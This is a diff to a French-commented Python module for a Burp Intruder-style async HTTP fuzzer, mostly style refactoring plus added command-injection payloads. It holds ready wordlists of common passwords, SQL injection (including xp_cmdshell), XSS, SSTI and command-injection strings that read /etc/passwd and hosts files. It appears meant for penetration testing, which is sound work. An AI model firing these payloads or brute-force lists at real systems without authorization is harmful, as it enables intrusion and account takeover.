@@ -1,5 +1,4 @@
-"""
-Intruder style Burp — fuzzing paramétrable avec positions, payloads et filtres.
+"""Intruder style Burp — fuzzing paramétrable avec positions, payloads et filtres.
 
 Modes d'attaque :
 - sniper : une position à la fois, les autres conservent leur valeur originale
@@ -18,11 +17,10 @@ Payloads prédéfinies intégrées :
 """
 
 import asyncio
-import copy
 import re
 import time
 from dataclasses import dataclass, field
-from datetime import datetime, timezone
+from datetime import UTC, datetime
 from enum import StrEnum
 from typing import Any
 from urllib.parse import urlencode, urlparse, urlunparse
@@ -53,6 +51,7 @@ PREDEFINED_PAYLOADS: dict[str, list[str]] = {}
 # --- Nombres 1-100 ---
 PREDEFINED_PAYLOADS["numbers"] = [str(i) for i in range(1, 101)]
 
+
 # --- Dates récentes et courantes ---
 def _generate_dates() -> list[str]:
     dates: list[str] = []
@@ -64,32 +63,122 @@ def _generate_dates() -> list[str]:
                     dates.append(f"{year:04d}-{month:02d}-{day:02d}")
                     dates.append(f"{day:02d}/{month:02d}/{year:04d}")
     # Aujourd'hui et variantes
-    now = datetime.now(timezone.utc)
+    now = datetime.now(UTC)
     dates.append(now.strftime("%Y-%m-%d"))
     dates.append(now.strftime("%d/%m/%Y"))
     dates.append(now.strftime("%m/%d/%Y"))
     return dates
 
+
 PREDEFINED_PAYLOADS["dates"] = _generate_dates()
 
 # --- Top 100 mots de passe ---
 COMMON_PASSWORDS: list[str] = [
-    "password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567",
-    "letmein", "trustno1", "dragon", "baseball", "iloveyou", "master", "sunshine",
-    "welcome", "shadow", "ashley", "football", "jesus", "michael", "ninja",
-    "mustang", "password1", "admin", "administrator", "root", "toor", "passw0rd",
-    "p@ssword", "Passw0rd!", "test", "test123", "guest", "demo", "changeme",
-    "secret", "1234", "12345", "123456789", "1234567890", "qwerty123", "1q2w3e",
-    "123qwe", "qwe123", "pass", "pass123", "Pa$$word", "Pa$$w0rd", "P@ssw0rd",
-    "admin123", "admin1", "Admin123", "Admin@123", "manager", "server", "backup",
-    "cisco", "router", "switch", "hp", "dell", "ibm", "oracle", "mysql", "sql",
-    "default", "default1", "system", "sysadmin", "sa", "user", "user1",
-    "user123", "operator", "support", "info", "marketing", "sales", "finance",
-    "hr", "admin2019", "admin2020", "admin2021", "admin2022", "admin2023",
-    "admin2024", "password123", "password1234", "Password1", "Password123",
-    "P@ssword123", "Passw0rd123", "Changeme1", "Temp123", "Temp@123",
-    "Welcome1", "Welcome123", "Summer2023", "Winter2023", "Spring2024",
-    "Autumn2024", "letmein123", "qwerty12345", "1qaz2wsx", "zaqxsw",
+    "password",
+    "123456",
+    "12345678",
+    "qwerty",
+    "abc123",
+    "monkey",
+    "1234567",
+    "letmein",
+    "trustno1",
+    "dragon",
+    "baseball",
+    "iloveyou",
+    "master",
+    "sunshine",
+    "welcome",
+    "shadow",
+    "ashley",
+    "football",
+    "jesus",
+    "michael",
+    "ninja",
+    "mustang",
+    "password1",
+    "admin",
+    "administrator",
+    "root",
+    "toor",
+    "passw0rd",
+    "p@ssword",
+    "Passw0rd!",
+    "test",
+    "test123",
+    "guest",
+    "demo",
+    "changeme",
+    "secret",
+    "1234",
+    "12345",
+    "123456789",
+    "1234567890",
+    "qwerty123",
+    "1q2w3e",
+    "123qwe",
+    "qwe123",
+    "pass",
+    "pass123",
+    "Pa$$word",
+    "Pa$$w0rd",
+    "P@ssw0rd",
+    "admin123",
+    "admin1",
+    "Admin123",
+    "Admin@123",
+    "manager",
+    "server",
+    "backup",
+    "cisco",
+    "router",
+    "switch",
+    "hp",
+    "dell",
+    "ibm",
+    "oracle",
+    "mysql",
+    "sql",
+    "default",
+    "default1",
+    "system",
+    "sysadmin",
+    "sa",
+    "user",
+    "user1",
+    "user123",
+    "operator",
+    "support",
+    "info",
+    "marketing",
+    "sales",
+    "finance",
+    "hr",
+    "admin2019",
+    "admin2020",
+    "admin2021",
+    "admin2022",
+    "admin2023",
+    "admin2024",
+    "password123",
+    "password1234",
+    "Password1",
+    "Password123",
+    "P@ssword123",
+    "Passw0rd123",
+    "Changeme1",
+    "Temp123",
+    "Temp@123",
+    "Welcome1",
+    "Welcome123",
+    "Summer2023",
+    "Winter2023",
+    "Spring2024",
+    "Autumn2024",
+    "letmein123",
+    "qwerty12345",
+    "1qaz2wsx",
+    "zaqxsw",
 ]
 
 PREDEFINED_PAYLOADS["passwords"] = COMMON_PASSWORDS[:100]
@@ -103,8 +192,8 @@ PREDEFINED_PAYLOADS["sqli"] = [
     "' OR '1'='1' --",
     "' OR '1'='1' #",
     "' OR '1'='1'/*",
-    "\" OR \"1\"=\"1",
-    "\" OR \"1\"=\"1\" --",
+    '" OR "1"="1',
+    '" OR "1"="1" --',
     "1' AND '1'='1",
     "1' AND '1'='2",
     "' AND 1=1--",
@@ -130,8 +219,8 @@ PREDEFINED_PAYLOADS["sqli"] = [
     "1 AND 1=1 UNION SELECT 1,2,3",
     "') OR 1=1--",
     "')) OR 1=1--",
-    "\" OR 1=1--",
-    "\")) OR 1=1--",
+    '" OR 1=1--',
+    '")) OR 1=1--',
     "1;SELECT 1",
     "1';SELECT 1--",
     "' EXEC xp_cmdshell('dir')--",
@@ -147,7 +236,7 @@ PREDEFINED_PAYLOADS["sqli"] = [
 PREDEFINED_PAYLOADS["xss"] = [
     "<script>alert(1)</script>",
     "<script>alert('XSS')</script>",
-    "\"><script>alert(1)</script>",
+    '"><script>alert(1)</script>',
     "'><script>alert(1)</script>",
     "</script><script>alert(1)</script>",
     "<img src=x onerror=alert(1)>",
@@ -159,17 +248,17 @@ PREDEFINED_PAYLOADS["xss"] = [
     "<details open ontoggle=alert(1)>",
     "<select autofocus onfocus=alert(1)>",
     "';alert(1);//",
-    "\";alert(1);//",
+    '";alert(1);//',
     "';alert(1)-->",
-    "\" autofocus onfocus=alert(1)>",
+    '" autofocus onfocus=alert(1)>',
     "javascript:alert(1)",
     "<a href=javascript:alert(1)>click</a>",
     "<iframe src=javascript:alert(1)>",
     "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
     "<div/onmouseover='alert(1)'>HOVER</div>",
-    "<meta http-equiv=\"refresh\" content=\"0;javascript:alert(1)\">",
+    '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
     "{{constructor.constructor('alert(1)')()}}",
-    "\"-alert(1)-\"",
+    '"-alert(1)-"',
     "'-alert(1)-'",
     "`-alert(1)-`",
 ]
@@ -202,6 +291,7 @@ PREDEFINED_PAYLOADS["path_traversal"] = [
 
 # --- Command injection wordlist ---
 PREDEFINED_PAYLOADS["command_injection"] = [
+    # Séparateurs de base
     "; ls",
     "; ls -la",
     "| ls",
@@ -215,17 +305,35 @@ PREDEFINED_PAYLOADS["command_injection"] = [
     "| dir",
     "; id",
     "| id",
-    "`id`",
     "$(whoami)",
     "'; ls -la'",
-    "\"; ls -la\"",
+    '"; ls -la"',
     "| whoami",
     "; whoami",
     "& whoami",
     "&& whoami &&",
     "|| whoami",
     "'; cat /etc/passwd; '",
-    "\"; cat /etc/passwd; \"",
+    '"; cat /etc/passwd; "',
+    # Commandes Unix supplémentaires
+    "| cat /etc/hosts",
+    "; cat /etc/hosts",
+    "`cat /etc/hosts`",
+    "| nslookup 127.0.0.1",
+    "; nslookup 127.0.0.1",
+    "& nslookup 127.0.0.1",
+    # Commandes Windows
+    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "; type C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "| dir C:\\Windows\\System32",
+    "&& type C:\\Windows\\System32\\drivers\\etc\\hosts",
+    # Encodage URL simple
+    "%3Bid",
+    "%7Cid",
+    "%3Bcat%20/etc/passwd",
+    # Double encodage URL
+    "%253Bid",
+    "%257Cid",
 ]
 
 # --- SSTI wordlist ---
@@ -250,6 +358,7 @@ PREDEFINED_PAYLOADS["ssti"] = [
 # ---------------------------------------------------------------------------
 # Dataclasses
 # ---------------------------------------------------------------------------
+
 
 @dataclass
 class IntruderResult:
@@ -301,6 +410,7 @@ class IntruderReport:
 # Filtres
 # ---------------------------------------------------------------------------
 
+
 @dataclass
 class IntruderFilters:
     """Filtres à appliquer aux résultats."""
@@ -311,9 +421,8 @@ class IntruderFilters:
 
     def matches(self, result: IntruderResult) -> bool:
         """Vérifie si un résultat passe tous les filtres."""
-        if self.filter_status:
-            if result.status_code not in self.filter_status:
-                return False
+        if self.filter_status and result.status_code not in self.filter_status:
+            return False
         if self.filter_length:
             lo, hi = self.filter_length
             if not (lo <= result.response_length <= hi):
@@ -326,6 +435,7 @@ class IntruderFilters:
 # ---------------------------------------------------------------------------
 # Moteur de positions
 # ---------------------------------------------------------------------------
+
 
 def _parse_position(position: str) -> tuple[str, str]:
     """Parse une chaîne de position en (type, nom).
@@ -358,6 +468,7 @@ def _apply_payload(
 
     Returns:
         Nouveau dict request modifié
+
     """
     req = {
         "method": request.get("method", "GET"),
@@ -379,6 +490,7 @@ def _apply_payload(
         elif isinstance(body, str):
             # Support JSON simple — injecter dans une clé
             import json as _json
+
             try:
                 parsed = _json.loads(body)
                 if isinstance(parsed, dict) and pos_name:
@@ -404,6 +516,7 @@ def _apply_payload(
     elif pos_type == "param":
         parsed = urlparse(req["url"])
         from urllib.parse import parse_qs
+
         params = parse_qs(parsed.query, keep_blank_values=True)
         params[pos_name] = [payload]
         new_query = urlencode(params, doseq=True)
@@ -434,14 +547,14 @@ def _apply_payload(
         else:
             # raw cookie replacement
             cookies = {"__raw__": payload}
-        req["headers"]["Cookie"] = "; ".join(
-            f"{k}={v}" for k, v in cookies.items()
-        )
+        req["headers"]["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
 
     elif pos_type == "raw":
         original_body = req.get("body")
         if isinstance(original_body, bytes):
-            req["body"] = payload.encode("utf-8", errors="replace") if isinstance(payload, str) else payload
+            req["body"] = (
+                payload.encode("utf-8", errors="replace") if isinstance(payload, str) else payload
+            )
         else:
             req["body"] = payload
 
@@ -462,6 +575,7 @@ def _set_nested_key(d: dict, path: str, value: Any) -> None:
 def _replace_form_field(body: str, field_name: str, value: str) -> str:
     """Remplace une valeur de champ dans un body form-urlencoded."""
     import urllib.parse as _up
+
     try:
         params = _up.parse_qs(body, keep_blank_values=True)
     except ValueError:
@@ -489,6 +603,7 @@ def _parse_cookies(cookie_header: str) -> dict[str, str]:
 # Intruder
 # ---------------------------------------------------------------------------
 
+
 class Intruder:
     """Fuzzer paramétrable style Burp Intruder.
 
@@ -499,6 +614,7 @@ class Intruder:
         timeout: Timeout des requêtes HTTP en secondes
         concurrency: Nombre maximum de requêtes concurrentes
         verify_ssl: Vérifier les certificats TLS
+
     """
 
     def __init__(
@@ -561,19 +677,34 @@ class Intruder:
 
         Raises:
             ValueError: Si les paramètres sont invalides
+
         """
         t0 = time.monotonic()
         client = await self._get_client()
         self._semaphore = asyncio.Semaphore(self.concurrency)
 
-        mode = IntruderMode(mode.lower()) if mode.lower() in IntruderMode._value2member_map_ else mode.lower()
-        if mode not in (IntruderMode.SNIPER, IntruderMode.CLUSTER_BOMB, IntruderMode.PITCHFORK, IntruderMode.BATTERING_RAM):
-            raise ValueError(f"Mode invalide : {mode} (attendu: sniper, cluster_bomb, pitchfork ou battering_ram)")
+        mode = (
+            IntruderMode(mode.lower())
+            if mode.lower() in IntruderMode._value2member_map_
+            else mode.lower()
+        )
+        if mode not in (
+            IntruderMode.SNIPER,
+            IntruderMode.CLUSTER_BOMB,
+            IntruderMode.PITCHFORK,
+            IntruderMode.BATTERING_RAM,
+        ):
+            msg = f"Mode invalide : {mode} (attendu: sniper, cluster_bomb, pitchfork ou battering_ram)"
+            raise ValueError(
+                msg,
+            )
 
         if not positions:
-            raise ValueError("Au moins une position est requise")
+            msg = "Au moins une position est requise"
+            raise ValueError(msg)
         if len(positions) > MAX_POSITIONS:
-            raise ValueError(f"Trop de positions : {len(positions)} (max {MAX_POSITIONS})")
+            msg = f"Trop de positions : {len(positions)} (max {MAX_POSITIONS})"
+            raise ValueError(msg)
 
         # Résoudre les payloads prédéfinis
         resolved_payloads = self._resolve_payloads(payloads)
@@ -589,7 +720,10 @@ class Intruder:
         # Pour cluster_bomb: liste de listes de (position, payload), chaque sous-liste
         # contient toutes les modifications à appliquer simultanément
         combinations = self._generate_combinations(
-            positions, resolved_payloads, mode, request
+            positions,
+            resolved_payloads,
+            mode,
+            request,
         )
 
         report = IntruderReport(
@@ -607,7 +741,8 @@ class Intruder:
         # Exécuter toutes les requêtes en parallèle (avec throttling)
         tasks = [
             self._execute_attack(
-                client, base_request=request,
+                client,
+                base_request=request,
                 modifications=combo,  # combo = [(pos, payload), ...]
                 filters=intruder_filters,
             )
@@ -621,7 +756,7 @@ class Intruder:
                 if result is not None:
                     results.append(result)
             except Exception as e:
-                logger.error("intruder_task_error", error=str(e))
+                logger.exception("intruder_task_error", error=str(e))
 
         report.results = results
         report.duration_ms = (time.monotonic() - t0) * 1000
@@ -642,7 +777,8 @@ class Intruder:
     # ------------------------------------------------------------------
 
     def _resolve_payloads(
-        self, payloads: dict[str, list[str]]
+        self,
+        payloads: dict[str, list[str]],
     ) -> dict[str, list[str]]:
         """Résout les payloads prédéfinis en listes de chaînes.
 
@@ -745,6 +881,7 @@ class Intruder:
             base_request: Requête de base à modifier
             modifications: Liste de tuples (position, payload) à appliquer
             filters: Filtres à appliquer au résultat
+
         """
         async with self._semaphore:  # type: ignore[union-attr]
             # Appliquer TOUTES les modifications à la même requête de base
@@ -793,7 +930,7 @@ class Intruder:
                     match = filters.grep_match in resp_body
 
             # Construire le résultat
-            result = IntruderResult(
+            return IntruderResult(
                 request_modifie={
                     "method": modified["method"],
                     "url": modified["url"],
@@ -811,12 +948,12 @@ class Intruder:
                 response_body=resp_body[:2000] if resp_body else "",
             )
 
-            return result
 
 
 # ---------------------------------------------------------------------------
 # Fonction utilitaire pour lancer une attaque rapide
 # ---------------------------------------------------------------------------
+
 
 async def quick_attack(
     url: str,
@@ -842,6 +979,7 @@ async def quick_attack(
 
     Returns:
         IntruderReport avec les résultats
+
     """
     # Construire la requête de base
     request: dict[str, Any] = {
@@ -855,6 +993,7 @@ async def quick_attack(
     if positions is None:
         parsed = urlparse(url)
         from urllib.parse import parse_qs
+
         params = parse_qs(parsed.query)
         positions = [f"param:{p}" for p in params]
         if not positions:
@@ -868,12 +1007,11 @@ async def quick_attack(
     # Créer l'Intruder et lancer l'attaque
     intruder = Intruder(**kwargs)
     try:
-        report = await intruder.attack(
+        return await intruder.attack(
             request=request,
             positions=positions,
             payloads={payload_category: []},  # Résolu via prédéfini
             mode=mode,
         )
-        return report
     finally:
         await intruder.close()
